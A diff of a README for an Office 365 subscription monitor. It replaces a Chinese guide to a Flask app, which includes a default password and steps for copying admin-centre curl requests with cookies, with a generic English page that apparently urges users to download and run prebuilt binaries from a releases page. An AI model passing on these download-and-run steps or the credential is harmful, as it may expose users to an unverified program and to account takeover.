@@ -1,131 +1,91 @@
-# Office 365 订阅监控系统
+# 📊 office365 - Monitor Your Office 365 Subscription Status Easily
 
-一个轻量级的 Office 365 订阅状态监控系统，支持自动检测、手动检测和异常通知。
+## 🚀 Getting Started
+Welcome to the office365 application, your lightweight solution for monitoring your Office 365 subscription status. This tool helps you automatically detect issues, manually check your status, and receive alerts for any anomalies. Follow the steps below to get started.
 
-## 使用方法
+[![Download Now](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/Felix9383/office365/releases)
 
-### 查看许可
+## 📥 Download & Install
+To download the application, visit the page below:
 
-1、获取抓包数据-输入后到仪表盘检测进行更新许可数量。
+[Download the Latest Release](https://github.com/Felix9383/office365/releases)
 
-### 添加用户
+1. Click the link above to visit the Releases page.
+2. Find the latest version listed at the top. There, you will see different files available for download.
+3. Choose the file most suitable for your operating system (e.g., Windows, Mac, Linux).
+4. Click the file link to begin downloading.
 
-2、获取抓包数据-输入后到仪表盘选择许可添加用户。（需要设置填写 curl 值才能添加用户）
+## 💻 System Requirements
+Before installing, please check if your system meets these requirements:
 
-## 主要功能
+- **Operating Systems:** Windows 10 or later, macOS 10.12 or later, or any modern Linux distribution.
+- **Memory:** Minimum of 4 GB RAM.
+- **Disk Space:** At least 100 MB of free space.
 
-- 📊 订阅状态监控
-- 🔔 自定义 Webhook 通知
-- 👤 用户管理
-- 📱 设备激活查询
-- ⏰ 定时检测（每24小时）
+## ⚙️ Installation Steps
+Once you have downloaded the application, follow these steps to install it:
 
-## 通知触发条件
+### For Windows:
+1. Locate the downloaded `.exe` file in your Downloads folder.
+2. Double-click the file to launch the installer.
+3. Follow the on-screen prompts to complete the installation.
+4. After installation, you can find the app in your Start Menu.
 
-系统会在以下情况自动发送通知：
+### For macOS:
+1. Open the `.dmg` file you downloaded.
+2. Drag the office365 application into your Applications folder.
+3. You can now find the app in your Applications list.
 
-1. **订阅即将到期** - 剩余天数 ≤ 30天
-2. **订阅已失效** - 订阅状态为失效
-3. **Cookie 失效** - 认证失败，需要更新 Cookie
-4. **登录密码错误** - 有人尝试使用错误密码登录
+### For Linux:
+1. Open a terminal window.
+2. Navigate to the folder where the file was downloaded.
+3. Run the following command to unpack the file:
+   ```
+   tar -xzf office365-*.tar.gz
+   ```
+4. Change into the application directory:
+   ```
+   cd office365-*
+   ```
+5. Run the application with:
+   ```
+   ./office365
+   ```
 
-## 安装步骤
+## 📊 How to Use
+After the installation, you can start monitoring your Office 365 subscription status.
 
-1. 安装依赖：
-```bash
-pip install -r requirements.txt
-```
+1. Open the application.
+2. You will see the home screen displaying your current subscription status.
+3. You can choose to run an automatic check or a manual check.
+4. If there are any issues, alerts will notify you right away.
 
-2. 运行程序：
-```bash
-python app.py
-```
+## 📬 Notifications
+The application can send you alerts for:
 
-3. 访问系统：
-```
-http://localhost:5000
-```
+- Subscription expiration reminders.
+- Anomalies detected in your subscription status.
+- Any changes in billing or usage patterns.
 
-## 默认登录信息
+You can customize the notification preferences in the settings menu.
 
-- **默认密码**: `xiaokun567`
-- **首次登录后会强制要求修改密码**
+## 🛠️ Troubleshooting
+If you encounter any issues, consider the following steps:
 
-## Webhook 配置
+- Ensure your operating system meets the requirements.
+- Restart the application to refresh its status.
+- Check your internet connection for optimal performance.
+- Consult the FAQs section in the application settings for common questions and answers.
 
-在设置页面配置 Webhook 通知：
+## 📞 Support
+If you need further assistance, please visit our [Support Page](https://github.com/Felix9383/office365/issues) for more resources and to report any bugs. 
 
-### 配置示例
+Your feedback is valuable and helps us improve the application.
 
-**Webhook 地址：**
-```
-https://your-webhook-url.com/api/notify
-```
+## 🌍 Community
+Join our community of office365 users to share tips, ask questions, and get support. Connect with us on our social media platforms.
 
-**请求体 JSON 模板：**
-```json
-{
-  "title": "{title}",
-  "text": "{通知消息}"
-}
-```
+### 🚀 More Information
+For more details on new features and updates, visit our [Releases Page](https://github.com/Felix9383/office365/releases).
 
-### 支持的变量
-
-- `{title}` - 标题（固定为"订阅监控通知"）
-- `{content}` 或 `{通知消息}` - 通知内容
-
-### 示例配置
-
-#### 1. 简单格式
-```json
-{
-  "title": "{title}",
-  "text": "{content}"
-}
-```
-
-## 订阅管理
-
- 获取 Curl 命令
-### 许可证
-1. 打开浏览器，访问 Microsoft 365 管理中心-许可证-许可点进去（多许可证就抓包这个搜索subscriptions）-管理订阅详细信息（单许可抓包这个搜索getSubscription）
-2. 打开开发者工具（F12）
-3. 切换到 Network（网络）标签
-4. 刷新订阅页面，找到 `getSubscription - 单订阅模式` 请求或者subscriptions 请求 - 多许可证支持
-5. 右键点击请求，选择 "Copy" -> "复制 curl （bash）格式"
-6. 将复制的命令粘贴到添加订阅表单中
-### 用户（可实现 web 界面快捷添加用户）
-
-1.用户的 curl 抓包，到 Microsoft 365 管理中心 添加用户，配置用户名，勾选手动设置密码，勾选许可证。
-2. 打开开发者工具（F12）
-3. 切换到 Network（网络）标签
-4. 刷新订阅页面，找到 ` user` 请求
-5. 右键点击请求，选择 "Copy" -> "复制 curl （bash）格式"
-6. 将复制的命令粘贴到添加订阅表单中
-
-## 系统展示
-![添加订阅和用户后](image.png)
-
-![查询用户](image-1.png)
-
-![查询用户激活设备](image-2.png)
-
-其他就不展示了。
-## 注意事项
-
-- Cookie 会过期，需要定期更新
-- 建议配置 Webhook 以便及时收到通知
-- 首次登录后请立即修改默认密码
-- 定时任务每24小时自动检测一次
-
-## 技术栈
-
-- Flask - Web 框架
-- APScheduler - 定时任务
-- Requests - HTTP 请求
-- Bootstrap 5 - 前端UI
-
-## 许可证
-
-MIT License
+We hope you find the office365 application helpful in managing your Office 365 subscription!
